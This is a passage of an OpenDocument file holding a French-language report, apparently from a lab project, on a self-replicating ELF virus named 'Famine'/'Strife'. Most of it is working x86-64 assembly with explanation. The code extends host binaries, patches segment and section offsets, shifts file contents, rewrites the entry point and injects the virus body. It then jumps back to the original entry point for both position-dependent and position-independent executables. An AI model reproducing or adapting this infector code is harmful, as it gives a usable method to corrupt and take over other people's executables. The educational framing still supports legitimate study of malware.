              <text:p text:style-name="P32">Patch les valeurs qui permettront au fichier infecté de revenir à son point d'entrée originel une fois le virus exécuté.</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10">(voir ci-dessous pour cette partie du code).</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P8"><text:span text:style-name="T27">Si le </text:span><text:span text:style-name="T26">gap </text:span><text:span text:style-name="T27">n'est pas assez grand cependant, on continue sur le virus de manière linéaire. Il va falloir étendre le fichier. Donc on commence par fermer le premier mapping qui représentait le fichier non-étendu.</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P8"><text:span text:style-name="T27">On appelle ensuite le </text:span><text:span text:style-name="T26">syscall ftruncate</text:span><text:span text:style-name="T27">, qui permet de redéfinir la taille d'un fichier (de le tronquer si jamais la taille indiquée est plus petite que la taille originelle, de l'étendre avec des NULL BYTES si elle est plus grande). On étend ici le fichier de </text:span><text:span text:style-name="T26">4096 bytes</text:span><text:span text:style-name="T27"> :</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P24"><text:span text:style-name="T10">mov </text:span><text:span text:style-name="T14">rdi</text:span><text:span text:style-name="T10">, </text:span><text:span text:style-name="T14">r8<text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T18">; r8 has file fd</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">mov </text:span><text:span text:style-name="T12">rsi</text:span><text:span text:style-name="T8">, FAM(famine.fsize)</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">add </text:span><text:span text:style-name="T12">rsi</text:span><text:span text:style-name="T8">, PAGE_SIZE</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">mov </text:span><text:span text:style-name="T12">rax</text:span><text:span text:style-name="T8">, SYS_FTRUNCATE</text:span></text:p>
      <text:p text:style-name="P23">syscall</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">cmp </text:span><text:span text:style-name="T12">rax</text:span><text:span text:style-name="T8">, </text:span><text:span text:style-name="T21">0</text:span></text:p>
      <text:p text:style-name="P23">jl _end_file_infection</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P8"><text:span text:style-name="T27">Une fois le fichier étendu, on produit un </text:span><text:span text:style-name="T26">second mmap </text:span><text:span text:style-name="T27">du fichier redimensionné. On va désormais travailler sur ce mapping.</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P8"><text:span text:style-name="T27">L'objectif va être désormais de déplacer l'intégralité du fichier suite au segment texte de </text:span><text:span text:style-name="T26">4096</text:span><text:span text:style-name="T27"> bytes afin de faire de la place pour le virus, sur ce schéma :</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"><draw:frame draw:style-name="fr1" draw:name="images1" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="4.318cm" draw:z-index="0"><draw:image xlink:href="Pictures/20000007000046CD000011FD4276E148.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><draw:frame draw:style-name="fr2" draw:name="images2" text:anchor-type="paragraph" svg:x="0cm" svg:y="4.657cm" svg:width="16.999cm" svg:height="2.866cm" draw:z-index="1"><draw:image xlink:href="Pictures/200000070000467E00000BE49399DE03.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P10">Avant de déplacer réellement les bytes, il nous faut cependant patcher un certain nombre de choses afin que notre fichier ELF continue de fonctionner suite au shift.</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P8"><text:span text:style-name="T27">Comme pour l'injection dans le gap, on commence par mettre à jour la </text:span><text:span text:style-name="T26">p_filesz</text:span><text:span text:style-name="T27"> et </text:span><text:span text:style-name="T26">p_memsz</text:span><text:span text:style-name="T27"> du header du segment texte (même si ce n'est pas vraiment nécessaire ici non plus).</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P8"><text:span text:style-name="T27">Ensuite, on va patcher tous les headers correspondant aux segments venant </text:span><text:span text:style-name="T26">après </text:span><text:span text:style-name="T27">le segment texte. On va indiquer que leur </text:span><text:span text:style-name="T26">offset dans le fichier </text:span><text:span text:style-name="T27">(</text:span><text:span text:style-name="T26">p_offset</text:span><text:span text:style-name="T27">) est 4096 bytes plus loin ; c'est essentiel pour que le binaire les retrouve à l'exécution.</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P8"><text:span text:style-name="T27">Pour cela, on se positionne simplement sur le header du segment texte dans le mapping du fichier ; on ajoute la taille d'un header de segment, et on loop en ajoutant à chaque fois PAGE_SIZE à </text:span><text:span text:style-name="T26">p_offset</text:span><text:span text:style-name="T27"> :</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P24"><text:span text:style-name="T10">mov </text:span><text:span text:style-name="T14">rax</text:span><text:span text:style-name="T10">, FAM(famine.txt_header)</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">add </text:span><text:span text:style-name="T12">rax</text:span><text:span text:style-name="T8">, FAM(famine.map_ptr)<text:tab/></text:span><text:span text:style-name="T16">; Go to text segment</text:span></text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20"><text:span text:style-name="T12">.</text:span><text:span text:style-name="T33">patch_segments:</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">add </text:span><text:span text:style-name="T12">rax</text:span><text:span text:style-name="T8">, elf64_phdr_size<text:tab/><text:tab/></text:span><text:span text:style-name="T16">; Go to next segment</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">mov </text:span><text:span text:style-name="T12">rdi</text:span><text:span text:style-name="T8">, </text:span><text:span text:style-name="T12">rax</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">add </text:span><text:span text:style-name="T12">rdi</text:span><text:span text:style-name="T8">, elf64_phdr.p_offset<text:tab/></text:span><text:span text:style-name="T16">; p_offset += PAGE_SIZE</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">mov </text:span><text:span text:style-name="T12">rsi</text:span><text:span text:style-name="T8">, [</text:span><text:span text:style-name="T12">rdi</text:span><text:span text:style-name="T8">]</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">add </text:span><text:span text:style-name="T12">rsi</text:span><text:span text:style-name="T8">, PAGE_SIZE</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">mov [</text:span><text:span text:style-name="T12">rdi</text:span><text:span text:style-name="T8">], </text:span><text:span text:style-name="T12">rsi</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">inc </text:span><text:span text:style-name="T12">r13</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">cmp </text:span><text:span text:style-name="T12">r13</text:span><text:span text:style-name="T8">, </text:span><text:span text:style-name="T12">r14</text:span><text:span text:style-name="T8"><text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T16">; r14 still has e_phnum.</text:span></text:p>
      <text:p text:style-name="P23">jne .patch_segments</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P8"><text:span text:style-name="T27">On fait ensuite pareil pour les sections. On parcourt l'intégralité des headers de section, et si l'offset de la section est situé après le point d'injection (</text:span><text:span text:style-name="T4">txt_offset + txt_filesz</text:span><text:span text:style-name="T27">), on ajoute 4096 bytes à l'offset afin que le binaire puisse retrouver ses sections.</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P8"><text:span text:style-name="T27">On finit par patch le header ELF, et plus particulièrement </text:span><text:span text:style-name="T26">e_shoff</text:span><text:span text:style-name="T27"> qui contient l'offset auquel démarre les headers de section : si cet offset doit être décalé, on le décale.</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10">On arrive maintenant à la partie du virus qui va se charger de décaler tout ce qui se situe après le segment texte + le gap de 4096 bytes.</text:p>
      <text:p text:style-name="P10"><text:soft-page-break/></text:p>
      <text:p text:style-name="P24"><text:span text:style-name="T14">.</text:span><text:span text:style-name="T34">write:</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">mov </text:span><text:span text:style-name="T12">rsi</text:span><text:span text:style-name="T8">, FAM(famine.map_ptr)</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">add </text:span><text:span text:style-name="T12">rsi</text:span><text:span text:style-name="T8">, FAM(famine.fsize)<text:tab/><text:tab/></text:span><text:span text:style-name="T16">; rsi is at the end of the original file</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">mov </text:span><text:span text:style-name="T12">rdi</text:span><text:span text:style-name="T8">, </text:span><text:span text:style-name="T12">rsi</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">add </text:span><text:span text:style-name="T12">rdi</text:span><text:span text:style-name="T8">, PAGE_SIZE<text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T16">; rdi is 4096 bytes after rsi</text:span></text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20"><text:span text:style-name="T8">mov </text:span><text:span text:style-name="T12">rax</text:span><text:span text:style-name="T8">, FAM(famine.map_ptr)</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">add </text:span><text:span text:style-name="T12">rax</text:span><text:span text:style-name="T8">, FAM(famine.txt_offset)</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">add </text:span><text:span text:style-name="T12">rax</text:span><text:span text:style-name="T8">, FAM(famine.txt_filesz)</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">add </text:span><text:span text:style-name="T12">rax</text:span><text:span text:style-name="T8">, FAM(famine.gap_size)<text:tab/></text:span><text:span text:style-name="T16">; rax at text_segment + padding gap</text:span></text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20"><text:span text:style-name="T8">mov </text:span><text:span text:style-name="T12">rcx</text:span><text:span text:style-name="T8">, </text:span><text:span text:style-name="T12">rsi</text:span><text:span text:style-name="T8"><text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T16">; rcx is at the end of the original file</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">sub </text:span><text:span text:style-name="T12">rcx</text:span><text:span text:style-name="T8">, </text:span><text:span text:style-name="T12">rax</text:span><text:span text:style-name="T8"><text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T16">; rcx has length to move</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">inc </text:span><text:span text:style-name="T12">rcx</text:span></text:p>
      <text:p text:style-name="P23">std</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">rep movsb <text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T16">; shift everything by 4096 bytes</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P8"><text:span text:style-name="T27">Pour ce shift, on va utiliser l'instruction </text:span><text:span text:style-name="T26">rep movsb </text:span><text:span text:style-name="T27">qui va :</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T27">&gt; Copier le byte à l'adresse </text:span><text:span text:style-name="T26">[rsi]</text:span><text:span text:style-name="T27"> vers l'emplacement </text:span><text:span text:style-name="T26">[rdi]</text:span><text:span text:style-name="T27">.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T27">&gt; Incrémenter / décrémenter </text:span><text:span text:style-name="T26">rdi</text:span><text:span text:style-name="T27"> et </text:span><text:span text:style-name="T26">rsi</text:span><text:span text:style-name="T27"> (selon le Direction Flag </text:span><text:span text:style-name="T26">DF</text:span><text:span text:style-name="T27">).</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T27">&gt; Répéter l'opération jusqu'à ce que </text:span><text:span text:style-name="T26">rcx</text:span><text:span text:style-name="T27"> soit égal à 0.</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P8"><text:span text:style-name="T27">On calcule le nombre de bytes à shift, qu'on place dans </text:span><text:span text:style-name="T26">rcx</text:span><text:span text:style-name="T27">.</text:span></text:p>
      <text:p text:style-name="P9">On place <text:span text:style-name="T1">rsi </text:span><text:span text:style-name="T2">à la fin du fichier originel (source) ; on place </text:span><text:span text:style-name="T1">rdi </text:span><text:span text:style-name="T2">4096 bytes plus loin (destination). On inverse le </text:span><text:span text:style-name="T1">DF</text:span><text:span text:style-name="T2"> afin que </text:span><text:span text:style-name="T1">rsi </text:span><text:span text:style-name="T2">et </text:span><text:span text:style-name="T1">rdi </text:span><text:span text:style-name="T2">soient décrémentés (et non incrémentés), puis on lance la boucle de shift.</text:span></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12">Pourquoi part-on de la fin du fichier et décrémente-t-on rdi et rsi :</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"><draw:frame draw:style-name="fr2" draw:name="images3" text:anchor-type="paragraph" svg:x="0.152cm" svg:y="0cm" svg:width="10.345cm" svg:height="2.462cm" draw:z-index="2"><draw:image xlink:href="Pictures/200000070000286A0000099E6164520A.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T29">On voit ici avec l'exemple d'un décalage de </text:span><text:span text:style-name="T30">1 </text:span><text:span text:style-name="T31">qu'en décalant des données </text:span><text:span text:style-name="T30">vers l'avant</text:span><text:span text:style-name="T31"> puis en </text:span><text:span text:style-name="T30">incrémentant </text:span><text:span text:style-name="T31">notre pointeur, on se retrouve à déplacer les données qu'on vient en réalité de copier !</text:span></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P2"><text:span text:style-name="T31">Pour éviter cela, on part de la fin, on décale les données </text:span><text:span text:style-name="T30">vers l'avant</text:span><text:span text:style-name="T31"> mais on </text:span><text:span text:style-name="T30">décrémente</text:span><text:span text:style-name="T31"> notre pointeur. Ce dernier ne pointera donc jamais sur des données qu'on vient de décaler.</text:span></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P2"><text:span text:style-name="T31">Bref, on a tout décalé de 4096 bytes. On patch maintenant le point d'entrée du fichier ELF. On commence par sauvegarder le point d'entrée originel dans notre structure, puis on remplace dans le header ELF ce point d'entrée par le point d'injection (</text:span><text:span text:style-name="T32">txt_vaddr + txt_filesz</text:span><text:span text:style-name="T31">).</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P20"><text:span text:style-name="T8">mov </text:span><text:span text:style-name="T12">rax</text:span><text:span text:style-name="T8">, FAM(famine.map_ptr)</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">add </text:span><text:span text:style-name="T12">rax</text:span><text:span text:style-name="T8">, elf64_ehdr.e_entry</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">mov </text:span><text:span text:style-name="T12">rsi</text:span><text:span text:style-name="T8">, [</text:span><text:span text:style-name="T12">rax</text:span><text:span text:style-name="T8">]</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">mov FAM(famine.orig_entry), </text:span><text:span text:style-name="T12">rsi</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">mov </text:span><text:span text:style-name="T12">rdi</text:span><text:span text:style-name="T8">, FAM(famine.txt_vaddr)</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">add </text:span><text:span text:style-name="T12">rdi</text:span><text:span text:style-name="T8">, FAM(famine.txt_filesz)</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">mov </text:span><text:span text:style-name="T12">r13</text:span><text:span text:style-name="T8">, </text:span><text:span text:style-name="T12">rdi</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">mov [</text:span><text:span text:style-name="T12">rax</text:span><text:span text:style-name="T8">], </text:span><text:span text:style-name="T12">rdi</text:span></text:p>
      <text:p text:style-name="P9"><text:soft-page-break/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T29">On peut désormais écrire notre virus au point d'injection (on reset le </text:span><text:span text:style-name="T30">DF</text:span><text:span text:style-name="T31"> car maintenant on va copier de manière classique) :</text:span></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P21"><text:span text:style-name="T9">mov </text:span><text:span text:style-name="T13">rdi</text:span><text:span text:style-name="T9">, FAM(famine.map_ptr)</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">add </text:span><text:span text:style-name="T12">rdi</text:span><text:span text:style-name="T8">, FAM(famine.txt_offset)</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">add </text:span><text:span text:style-name="T12">rdi</text:span><text:span text:style-name="T8">, FAM(famine.txt_filesz)</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">lea </text:span><text:span text:style-name="T12">rsi</text:span><text:span text:style-name="T8">, [</text:span><text:span text:style-name="T12">rel</text:span><text:span text:style-name="T8"> _start]</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">mov </text:span><text:span text:style-name="T12">rcx</text:span><text:span text:style-name="T8">, VIRUS_SIZE</text:span></text:p>
      <text:p text:style-name="P23">cld</text:p>
      <text:p text:style-name="P23">repnz movsb</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Il nous reste maintenant une dernière tâche à faire, qui est de <text:span text:style-name="T1">permettre au fichier infecté de se rediriger vers le point d'entrée originel</text:span><text:span text:style-name="T2"> une fois le virus exécuté.</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P2"><text:span text:style-name="T2">Attention cependant, pour l'exécutable originel (</text:span><text:span text:style-name="T1">./Strife</text:span><text:span text:style-name="T2">), il faut simplement que le programme </text:span><text:span text:style-name="T1">exit</text:span><text:span text:style-name="T2"> après s'être exécuté, il ne s'agit pas d'un virus dans un fichier hôte, mais d'un simple binaire.</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P2"><text:span text:style-name="T2">Pour cela, on va définir deux variables tout à la fin du virus, </text:span><text:span text:style-name="T1">host_entry </text:span><text:span text:style-name="T2">et </text:span><text:span text:style-name="T1">virus_entry</text:span><text:span text:style-name="T2"> :</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P27"><text:span text:style-name="T9">target_1<text:tab/><text:tab/></text:span><text:span text:style-name="T13">db</text:span><text:span text:style-name="T9"> "/tmp/test/",</text:span><text:span text:style-name="T22">0x0</text:span></text:p>
      <text:p text:style-name="P26"><text:span text:style-name="T8">target_2<text:tab/><text:tab/></text:span><text:span text:style-name="T12">db</text:span><text:span text:style-name="T8"> "/tmp/test2/",</text:span><text:span text:style-name="T21">0x0</text:span></text:p>
      <text:p text:style-name="P26"><text:span text:style-name="T8">signature<text:tab/><text:tab/></text:span><text:span text:style-name="T12">db</text:span><text:span text:style-name="T8"> "Famine version </text:span><text:span text:style-name="T21">1.0</text:span><text:span text:style-name="T8"> (c)oded by qroland",</text:span><text:span text:style-name="T21">0x0</text:span></text:p>
      <text:p text:style-name="P26"><text:span text:style-name="T8">host_entry<text:tab/><text:tab/></text:span><text:span text:style-name="T12">dq</text:span><text:span text:style-name="T8"> _exit</text:span></text:p>
      <text:p text:style-name="P26"><text:span text:style-name="T8">virus_entry<text:tab/></text:span><text:span text:style-name="T12">dq</text:span><text:span text:style-name="T8"> _start</text:span></text:p>
      <text:p text:style-name="P28">_finish:</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P2"><text:span text:style-name="T2">On initialise ces variables respectivement à </text:span><text:span text:style-name="T1">_exit </text:span><text:span text:style-name="T2">et </text:span><text:span text:style-name="T1">_start</text:span><text:span text:style-name="T2"> (elles contiennent les adresses de ces labels).</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Lorsque le virus a fini d'itérer sur les dossiers, on quitte de cette façon :</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P25">; === Deleting our 'famine' struct from the stack</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">add </text:span><text:span text:style-name="T12">rsp</text:span><text:span text:style-name="T8">, famine_size</text:span></text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P25">; === Placing original entry point in r15 (see comment at the end of file) ===</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">lea </text:span><text:span text:style-name="T12">r15</text:span><text:span text:style-name="T8">, [</text:span><text:span text:style-name="T12">rel</text:span><text:span text:style-name="T8"> _start]</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">mov </text:span><text:span text:style-name="T12">rsi</text:span><text:span text:style-name="T8">, [</text:span><text:span text:style-name="T12">rel</text:span><text:span text:style-name="T8"> virus_entry]</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">sub </text:span><text:span text:style-name="T12">r15</text:span><text:span text:style-name="T8">, </text:span><text:span text:style-name="T12">rsi</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">add </text:span><text:span text:style-name="T12">r15</text:span><text:span text:style-name="T8">, [</text:span><text:span text:style-name="T12">rel</text:span><text:span text:style-name="T8"> host_entry]</text:span></text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P25">; === Restoring registers and jumping to original entry point ===</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">pop </text:span><text:span text:style-name="T12">rbp</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">pop </text:span><text:span text:style-name="T12">rdx</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">pop </text:span><text:span text:style-name="T12">rcx</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">pop </text:span><text:span text:style-name="T12">rsi</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">pop </text:span><text:span text:style-name="T12">rdi</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">jmp </text:span><text:span text:style-name="T12">r15</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P2"><text:span text:style-name="T2">Pour le fichier originel du virus (</text:span><text:span text:style-name="T1">./Strife</text:span><text:span text:style-name="T2">), on aura :</text:span></text:p>
      <text:p text:style-name="P4">&gt; r15<text:tab/><text:tab/>--&gt; address of _start</text:p>
      <text:p text:style-name="P4">&gt; rsi<text:tab/><text:tab/>--&gt; address of _start</text:p>
      <text:p text:style-name="P4">&gt; r15<text:tab/><text:tab/>--&gt; 0</text:p>
      <text:p text:style-name="P4">&gt; r15<text:tab/><text:tab/>--&gt; _exit</text:p>
      <text:p text:style-name="P7"><text:soft-page-break/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T2">Le programme va donc bien simplement </text:span><text:span text:style-name="T1">exit</text:span><text:span text:style-name="T2"> après s'être exécuté. Pour les fichiers infectés, il nous faut cependant modifier ce comportement afin qu'on ne quitte pas, mais qu'on redirige vers l'entry point originel.</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Lorsqu'on écrit le virus dans un fichier infecté, on a donc tout à la fin ce bout de code :</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P21"><text:span text:style-name="T9">mov </text:span><text:span text:style-name="T13">qword</text:span><text:span text:style-name="T9"> [</text:span><text:span text:style-name="T13">rdi</text:span><text:span text:style-name="T9"> - </text:span><text:span text:style-name="T22">8</text:span><text:span text:style-name="T9">], </text:span><text:span text:style-name="T13">r13<text:tab/><text:tab/></text:span><text:span text:style-name="T17">; r13 has txt_vaddr + txt_filesz</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">mov </text:span><text:span text:style-name="T12">r14</text:span><text:span text:style-name="T8">, FAM(famine.orig_entry)</text:span></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T11">mov </text:span><text:span text:style-name="T15">qword</text:span><text:span text:style-name="T11"> [</text:span><text:span text:style-name="T15">rdi</text:span><text:span text:style-name="T11"> - </text:span><text:span text:style-name="T23">16</text:span><text:span text:style-name="T11">], </text:span><text:span text:style-name="T15">r14<text:tab/><text:tab/></text:span><text:span text:style-name="T19">; </text:span><text:span text:style-name="T20">r14 has orig_entry</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P2"><text:span text:style-name="T2">On patch donc ici en premier </text:span><text:span text:style-name="T1">virus_entry</text:span><text:span text:style-name="T2">, qui contient désormais l'adresse du virus.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T2">En second, on patch </text:span><text:span text:style-name="T1">host_entry</text:span><text:span text:style-name="T2"> avec l'entry point originel du fichier.</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P2"><text:span text:style-name="T2">Ce qui est intéressant ici est que ce mécanisme permet au virus de revenir à l'entry point originel du fichier en quittant </text:span><text:span text:style-name="T1">pour les PDC et les PIC</text:span><text:span text:style-name="T1"><text:note text:id="ftn1" text:note-class="footnote"><text:note-citation>1</text:note-citation><text:note-body><text:p text:style-name="P29">: Si on se préoccupait uniquement de Position-Dependent-Code cela aurait été plus simple, et on aurait pu simplement définir une seule variable, host_entry, la patcher avec orig_entry et faire en sortes que le fichier infecté y <text:span text:style-name="T1">jmp</text:span><text:span text:style-name="T2"> en sortie. Cela ne fonctionnerait cependant pas avec du PIC, car orig_entry ne contiendrait qu'un </text:span><text:span text:style-name="T1">offset</text:span><text:span text:style-name="T2"> et pas une véritable adresse.</text:span></text:p></text:note-body></text:note></text:span><text:span text:style-name="T2">. Dans le cas d'un PDC, en sortie du virus :</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P4">&gt; r15<text:tab/><text:tab/>--&gt; virtual address of _start</text:p>
      <text:p text:style-name="P4">&gt; rsi<text:tab/><text:tab/>--&gt; virtual address of _start</text:p>
      <text:p text:style-name="P4">&gt; r15<text:tab/><text:tab/>--&gt; 0</text:p>
      <text:p text:style-name="P4">&gt; r15<text:tab/><text:tab/>--&gt; orig_entry (virtual address)</text:p>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="https://unix.stackexchange.com/questions/89211/how-to-test-whether-a-linux-binary-was-compiled-as-position-independent-code" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"/></text:p>
      <text:p text:style-name="P2">Dans le cas d'un PIC :</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P4">&gt; r15<text:tab/><text:tab/>--&gt; virtual address of _start</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T2">&gt; rsi<text:tab/><text:tab/>--&gt; </text:span><text:span text:style-name="T1">offset</text:span><text:span text:style-name="T2"> of _start from start of file</text:span></text:p>
      <text:p text:style-name="P4">&gt; r15<text:tab/><text:tab/>--&gt; virtual address of start of file</text:p>
      <text:p text:style-name="P4">&gt; r15<text:tab/><text:tab/>--&gt; virtual address of start of file + offset of original <text:tab/><text:tab/><text:tab/><text:tab/>entry point</text:p>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="https://unix.stackexchange.com/questions/89211/how-to-test-whether-a-linux-binary-was-compiled-as-position-independent-code" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"/></text:p>
      <text:p text:style-name="P2">C'est ainsi que cette configuration nous permet bien d'exit lorsqu'on a le binaire originel, et sauter vers l'entry point originel pour le PDC <text:span text:style-name="T6">et</text:span><text:span text:style-name="T35"> le PIC.</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text:soft-page-break/><text:span text:style-name="T35">&gt;&gt; </text:span><text:span text:style-name="T36">LES LIMITATIONS DE STRIFE</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17">Strife utilise finalement la méthode qu'on a employé dans woody-woodpacker afin d'étendre le segment texte si on a pas assez de place afin d'injecter le payload. Il s'agit d'une méthode qui fonctionnera bien dans le plupart des cas, mais qui présente également une limitation.</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P2"><text:span text:style-name="T35">En effet, </text:span><text:span text:style-name="T36">Strife </text:span><text:span text:style-name="T35">fonctionne correctement lorsque le fichier ELF présente une répartition classique des segments, avec uniquement </text:span><text:span text:style-name="T36">deux LOAD segments</text:span><text:span text:style-name="T35"> :</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><draw:frame draw:style-name="fr3" draw:name="images4" text:anchor-type="paragraph" svg:width="18.999cm" svg:height="10.384cm" draw:z-index="3"><draw:image xlink:href="Pictures/2000000700004C62000029C23B66FE3A.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P17">Dans ce cas de figure classique (la plupart des fichiers ELF sont compilés de cette façon), on augmente simplement la taille du segment texte dans le fichier, et on décale l'offset des segments et sections subséquents dans le fichier. Suite à l'extension :</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><draw:frame draw:style-name="fr1" draw:name="images5" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="6.629cm" draw:z-index="4"><draw:image xlink:href="Pictures/2000000700004D1B00001E143A8C731C.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
